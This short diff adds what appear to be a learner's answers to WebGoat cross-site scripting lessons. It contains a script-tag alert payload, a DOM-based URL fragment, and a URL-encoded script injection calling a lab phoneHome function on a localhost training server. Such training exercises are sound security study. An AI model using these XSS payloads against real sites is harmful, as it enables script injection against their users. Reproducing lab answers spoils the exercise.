@@ -1,0 +1,12 @@
+lesson 7
+<script>alert("XSS")</script>
+<script>alert("XSS")</script>
+
+lesson 10
+start.mvc#test/
+
+lesson 11
+http://127.0.0.1:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome%28%29%3C%2Fscript%3E
+
+lesson 12
+43124
